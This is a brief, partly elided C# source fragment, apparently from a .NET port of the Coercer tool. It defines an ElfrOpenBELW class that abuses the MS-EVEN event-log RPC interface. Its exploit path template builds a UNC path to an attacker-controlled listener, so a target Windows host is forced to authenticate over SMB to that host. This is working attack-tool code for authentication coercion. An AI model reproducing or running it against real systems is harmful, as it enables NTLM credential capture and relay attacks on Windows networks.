...
namespace Coercer_dotnet.methods.MS_EVEN
{
    ...
    {
        public ElfrOpenBELW(AuthType authType, string listener) : base(authType, listener) { }
        public ElfrOpenBELW(AuthType authType, string listener, int port) : base(authType, listener, port) { }
        public ElfrOpenBELW(AuthType authType, string listener, int httpPort, int smbPort) : base(authType, listener, httpPort, smbPort) { }
        ...
        public override ExploitPathTemplate[] ExploitPathTemplates => new ExploitPathTemplate[] { new(AuthType.SMB, "\\??\\UNC\\{{listener}}{{port}}\\{{8}}\\aa") };
